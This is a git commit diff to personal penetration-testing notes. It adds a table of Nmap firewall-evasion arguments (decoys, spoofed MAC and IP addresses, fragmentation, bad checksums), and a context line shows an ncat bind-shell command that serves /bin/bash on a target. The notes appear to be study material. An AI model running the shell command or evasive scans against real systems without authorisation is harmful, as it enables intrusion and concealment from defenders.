8ce0644db76af1a6dbb85d2a4d150055929adbca
Mohammad Shadab <120562941+Imshad18@users.noreply.github.com>
2025-02-20 13:03:00 +0530

    Update nmap_firewall_evasion.sh

--- nmap_firewall_evasion.sh
+++ nmap_firewall_evasion.sh
@@ -81,35 +81,20 @@ ncat -lvnp PORT_NUMBER -e /bin/bash   on target machine
 and listener on our machine nc Target_IP Port
 remener any port below 1024 needs root/sudo
 
+____________________________________________________________________________________________________________________________________________
 
+All options
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+     Evasion Approach                 	                                       Nmap Argument
+Hide a scan with decoys	                                               -D DECOY1_IP1,DECOY_IP2,ME
+Use an HTTP/SOCKS4 proxy to relay connections	                           --proxies PROXY_URL
+Spoof source MAC address	                                              --spoof-mac MAC_ADDRESS
+Spoof source IP address	                                                      -S IP_ADDRESS
+Use a specific source port number	                                -g PORT_NUM or --source-port PORT_NUM
+Fragment IP data into 8 bytes	                                                    -f
+Fragment IP data into 16 bytes	                                                 -ff
+Fragment packets with given MTU	                                             --mtu VALUE
+Specify packet length	                                                    --data-length NUM
+Set IP time-to-live field	                                                    --ttl VALUE
+Send packets with specified IP options                                  	--ip-options OPTIONS
+Send packets with a wrong TCP/UDP checksum	                                   --badsum
